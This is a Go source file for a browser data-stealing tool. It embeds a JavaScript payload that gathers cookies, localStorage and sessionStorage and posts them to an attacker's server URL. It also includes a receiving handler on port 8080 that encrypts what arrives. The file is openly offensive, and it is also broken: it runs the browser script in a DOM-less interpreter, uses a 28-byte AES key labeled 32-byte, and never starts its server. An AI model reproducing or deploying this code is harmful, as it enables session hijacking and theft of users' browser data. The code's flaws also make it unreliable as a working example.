package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"

	"github.com/robertkrimen/otto"
)

type ExfiltratedData struct {
	Cookies       string `json:"cookies"`
	LocalStorage  string `json:"local_storage"`
	SessionStorage string `json:"session_storage"`
	IndexedDB     string `json:"indexed_db"`
	WebRTC        string `json:"webrtc"`
}

const encryptionKey = "32-byte-long-encryption-key!"

func main() {
	if len(os.Args) != 2 {
		fmt.Printf("Usage: %s <SERVER_URL>\n", os.Args[0])
		os.Exit(1)
	}

	serverURL := os.Args[1]
	vm := otto.New()

	// Inject JavaScript payload
	jsPayload := fmt.Sprintf(`
		function sendData(endpoint, data) {
			var xhr = new XMLHttpRequest();
			xhr.open("POST", "%s" + endpoint, true);
			xhr.setRequestHeader("Content-Type", "application/json");
			xhr.send(JSON.stringify(data));
		}

		function collectData() {
			var data = {
				cookies: document.cookie,
				local_storage: JSON.stringify(localStorage),
				session_storage: JSON.stringify(sessionStorage),
				indexed_db: "Not implemented in this example",
				webrtc: "Not implemented in this example"
			};
			sendData("/exfiltrate", data);
		}

		collectData();
	`, serverURL)

	_, err := vm.Run(jsPayload)
	if err != nil {
		fmt.Printf("Error running JavaScript payload: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("JavaScript payload injected successfully.")
}

func exfiltrateHandler(w http.ResponseWriter, r *http.Request) {
	var data ExfiltratedData
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	encryptedData, err := encryptData(data)
	if err != nil {
		http.Error(w, "Encryption error", http.StatusInternalServerError)
		return
	}

	fmt.Printf("Received Data: %s\n", encryptedData)
}

func encryptData(data ExfiltratedData) (string, error) {
	block, err := aes.NewCipher([]byte(encryptionKey))
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	dataBytes, err := json.Marshal(data)
	if err != nil {
		return "", err
	}

	ciphertext := gcm.Seal(nonce, nonce, dataBytes, nil)
	return base64.URLEncoding.EncodeToString(ciphertext), nil
}

func startServer() {
	http.HandleFunc("/exfiltrate", exfiltrateHandler)

	server := &http.Server{
		Addr: ":8080",
	}

	fmt.Println("Server started on :8080")
	if err := server.ListenAndServe(); err != nil {
		fmt.Println("Server error:", err)
	}
}
